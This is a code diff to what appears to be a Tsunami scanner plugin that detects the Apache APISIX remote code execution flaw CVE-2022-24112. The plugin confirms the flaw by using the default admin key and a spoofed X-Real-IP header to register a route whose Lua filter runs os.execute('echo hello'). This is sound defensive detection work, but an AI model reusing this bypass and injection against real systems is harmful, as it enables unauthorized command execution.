@@ -3,6 +3,7 @@ package com.google.tsunami.plugins.detectors.rce.cve202224112;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
 import com.google.common.io.Resources;
+import com.google.common.util.concurrent.Uninterruptibles;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
@@ -19,10 +20,12 @@ import com.google.tsunami.proto.*;
 import javax.inject.Inject;
 import java.io.IOException;
 import java.time.Clock;
+import java.time.Duration;
 import java.time.Instant;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
+import static com.google.common.net.HttpHeaders.CONNECTION;
 import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
 import static com.google.tsunami.common.net.http.HttpRequest.get;
 import static com.google.tsunami.common.net.http.HttpRequest.post;
@@ -39,34 +42,28 @@ import static java.nio.charset.StandardCharsets.UTF_8;
 public final class Cve202224112Detector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
   private static final String BATCH_REQUEST_PATH = "apisix/batch-requests";
+  private static final int BATCH_REQUEST_WAIT_AFTER_TIMEOUT = 6;
   private static final String DEFAULT_ADMIN_KEY_TOKEN = "edd1c9f034335f136f87ad84b625c8f1";
   private static final String X_REAL_IP_BYPASS = "127.0.0.1";
-  private static final String PIPE_REQUEST_PATH = "apisix/admin/routes/rce";
+  private static final String PIPE_REQUEST_PATH = "apisix/admin/routes/tsunami_rce";
+  private static final int PIPE_REQUEST_EXPIRE_TTL = 30;
   private static final String PIPE_REQUEST_BODY_URI =
-          "/rce/" + Long.toHexString(Double.doubleToLongBits(Math.random()));
+      "tsunami_rce/" + Long.toHexString(Double.doubleToLongBits(Math.random()));
   private static final String PIPE_REQUEST_BODY_NAME =
-          Long.toHexString(Double.doubleToLongBits(Math.random()));
-  private static final String FILTER_FUNC_OS_EXEC = "function(vars) return os.execute('echo hello')==true end";
+      Long.toHexString(Double.doubleToLongBits(Math.random()));
+  private static final String FILTER_FUNC_OS_EXEC =
+      "function(vars) return os.execute('echo hello')==true end";
   private static final String FILTER_FUNC_FALSE = "function(vars) return false end";
-  private final String batchRequestBodyTemplate;
   private final Clock utcClock;
   private final HttpClient httpClient;
+  private String batchRequestBodyTemplate;
 
   @Inject
-  Cve202224112Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
+  Cve202224112Detector(@UtcClock Clock utcClock, HttpClient httpClient) throws IOException {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
-
-    String batchRequestBodyTemplate = "";
-    try {
-      batchRequestBodyTemplate =
-              Resources.toString(
-                      Resources.getResource(this.getClass(), "pipeRequestBody.json"), UTF_8);
-    } catch (IOException e) {
-      logger.atSevere().withCause(e).log(
-              "Should never happen. Couldn't load payload resource file");
-    }
-    this.batchRequestBodyTemplate = batchRequestBodyTemplate;
+    batchRequestBodyTemplate =
+            Resources.toString(Resources.getResource(this.getClass(), "pipeRequestBody.json"), UTF_8);
   }
 
   @Override
@@ -85,107 +82,109 @@ public final class Cve202224112Detector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
-    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
+    HttpResponse resp;
 
-    if (!isTargetAPISIX(networkService, targetUri))
-      return false;
+    var vulnRouteCreated = registerRouteRequest(networkService, FILTER_FUNC_OS_EXEC);
+    if (!vulnRouteCreated) return false;
 
-    for (String filterFunc : new String[] { FILTER_FUNC_OS_EXEC, FILTER_FUNC_FALSE }) {
-      HttpResponse resp = executeBatchRequest(networkService, targetUri, filterFunc);
-      if (!(resp.status().code() == HttpStatus.OK.code()
-          && resp.bodyJson().get().getAsJsonArray().get(0).getAsJsonObject().get("reason").getAsString().matches("Created|OK")))
-        return false;
+    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(BATCH_REQUEST_WAIT_AFTER_TIMEOUT));
 
-      resp = executeCreatedRouteRequest(networkService, targetUri);
-      if (filterFunc.equals(FILTER_FUNC_OS_EXEC) && !(resp.status().code() == HttpStatus.SERVICE_UNAVAILABLE.code()
-          || resp.status().code() == HttpStatus.BAD_GATEWAY.code())) return false;
-      else if (filterFunc.equals(FILTER_FUNC_FALSE) && resp.status().code() != HttpStatus.NOT_FOUND.code())
-        return false;
-    }
+    resp = executeCreatedRouteRequest(networkService);
+    if (resp == null || !(resp.status().code() == HttpStatus.SERVICE_UNAVAILABLE.code()
+            || resp.status().code() == HttpStatus.BAD_GATEWAY.code())) return false;
 
-    executeBatchRequest(networkService, targetUri, FILTER_FUNC_FALSE, true);
+    var trueNegativeRouteCreated = registerRouteRequest(networkService, FILTER_FUNC_FALSE);
+    if (!trueNegativeRouteCreated) return false;
+
+    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(BATCH_REQUEST_WAIT_AFTER_TIMEOUT));
+
+    resp = executeCreatedRouteRequest(networkService);
+    if (resp == null || resp.status().code() != HttpStatus.NOT_FOUND.code()) return false;
+
     return true;
   }
 
-  private boolean isTargetAPISIX(
-          NetworkService networkService,
-          String targetUri) {
-
-    HttpResponse resp = null;
-    try {
-      resp = httpClient.send(
-              get(targetUri).withEmptyHeaders().build(),
-              networkService
-      );
-    } catch (Exception e) {
-      logger.atFine().log("Failed to send request.");
-    }
-    return !resp.headers().get("Server").isEmpty() &&
-            resp.headers().get("Server").get().contains("APISIX/2.");
-  }
-
   private HttpResponse executeBatchRequest(
-          NetworkService networkService,
-          String targetUri, String filterFunc, boolean cleanUp) {
+      NetworkService networkService, String filterFunc) {
+    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
 
     HttpHeaders headers =
         HttpHeaders.builder()
             .addHeader("X-API-KEY", DEFAULT_ADMIN_KEY_TOKEN)
             .addHeader(CONTENT_TYPE, "application/json")
+            .addHeader(CONNECTION, "close")
             .build();
 
     String batchRequestBody = this.batchRequestBodyTemplate;
     String[] placeholders = {
-            "{{X_REAL_IP}}", "{{X_API_KEY}}", "{{PIPE_REQ_PATH}}",
-            "{{PIPE_REQ_METHOD}}", "{{PIPE_REQ_URI}}", "{{PIPE_REQ_NAME}}", "{{PIPE_REQ_FILTER_FUNC}}"
+      "{{X_REAL_IP}}",
+      "{{X_API_KEY}}",
+      "{{PIPE_REQ_PATH}}",
+      "{{PIPE_REQ_METHOD}}",
+      "{{PIPE_REQ_URI}}",
+      "{{PIPE_REQ_NAME}}",
+      "{{PIPE_REQ_FILTER_FUNC}}"
     };
     String[] replacements = {
-            X_REAL_IP_BYPASS, DEFAULT_ADMIN_KEY_TOKEN, "/" + PIPE_REQUEST_PATH,
-            !cleanUp ? "PUT": "DELETE", PIPE_REQUEST_BODY_URI, PIPE_REQUEST_BODY_NAME, filterFunc
+      X_REAL_IP_BYPASS,
+      DEFAULT_ADMIN_KEY_TOKEN,
+      "/" + PIPE_REQUEST_PATH + "?ttl=" + PIPE_REQUEST_EXPIRE_TTL,
+      "PUT",
+      "/" + PIPE_REQUEST_BODY_URI,
+      PIPE_REQUEST_BODY_NAME,
+      filterFunc
     };
 
-    for(int i=0; i<placeholders.length; i++) {
+    for (int i = 0; i < placeholders.length; i++) {
       batchRequestBody = batchRequestBody.replace(placeholders[i], replacements[i]);
     }
 
     HttpResponse resp = null;
     try {
-      resp = httpClient.send(post(targetUri + BATCH_REQUEST_PATH)
-              .setHeaders(headers)
-              .setRequestBody(ByteString.copyFromUtf8(batchRequestBody))
-              .build(), networkService);
+      resp =
+              httpClient.send(
+              post(targetUri + BATCH_REQUEST_PATH)
+                  .setHeaders(headers)
+                  .setRequestBody(ByteString.copyFromUtf8(batchRequestBody))
+                  .build(),
+              networkService);
     } catch (Exception e) {
-      logger.atFine().log("Failed to send request.");
+      logger.atWarning().log("Failed to send request.");
     }
     return resp;
   }
 
-  private HttpResponse executeBatchRequest(
-          NetworkService networkService,
-          String targetUri, String filterFunc) {
-    return executeBatchRequest(networkService, targetUri, filterFunc, false);
+  private boolean registerRouteRequest(NetworkService networkService, String filterFunc) {
+    HttpResponse resp = executeBatchRequest(networkService, filterFunc);
+    return resp != null && resp.status().code() == HttpStatus.OK.code()
+            && resp.bodyJson().isPresent()
+            && resp.bodyJson()
+            .get()
+            .getAsJsonArray()
+            .get(0)
+            .getAsJsonObject()
+            .get("status")
+            .getAsString()
+            .matches("200|201");
   }
 
-  private HttpResponse executeCreatedRouteRequest(
-          NetworkService networkService,
-          String targetUri) {
+  private HttpResponse executeCreatedRouteRequest(NetworkService networkService) {
+    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
 
     HttpHeaders headers =
-            HttpHeaders.builder()
-                    .addHeader("X-API-KEY", DEFAULT_ADMIN_KEY_TOKEN)
-                    .addHeader(CONTENT_TYPE, "application/json")
-                    .build();
+        HttpHeaders.builder()
+            .addHeader("X-API-KEY", DEFAULT_ADMIN_KEY_TOKEN)
+            .addHeader(CONTENT_TYPE, "application/json")
+            .addHeader(CONNECTION, "close")
+            .build();
 
     HttpResponse resp = null;
     try {
-      resp = httpClient.send(
-              get(targetUri + PIPE_REQUEST_BODY_URI)
-                      .setHeaders(headers)
-                      .build(),
-              networkService
-      );
+      resp =
+          httpClient.send(
+              get(targetUri + PIPE_REQUEST_BODY_URI).setHeaders(headers).build(), networkService);
     } catch (Exception e) {
-      logger.atFine().log("Failed to send request.");
+      logger.atWarning().log("Failed to send request.");
     }
     return resp;
   }
@@ -200,7 +199,7 @@ public final class Cve202224112Detector implements VulnDetector {
         .setVulnerability(
             Vulnerability.newBuilder()
                 .setMainId(
-                    VulnerabilityId.newBuilder().setPublisher("yuradoc").setValue("CVE-2022-24112"))
+                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY").setValue("CVE-2022-24112"))
                 .setSeverity(Severity.CRITICAL)
                 .setTitle("Apache APISIX RCE (CVE-2022-24112)")
                 .setDescription(
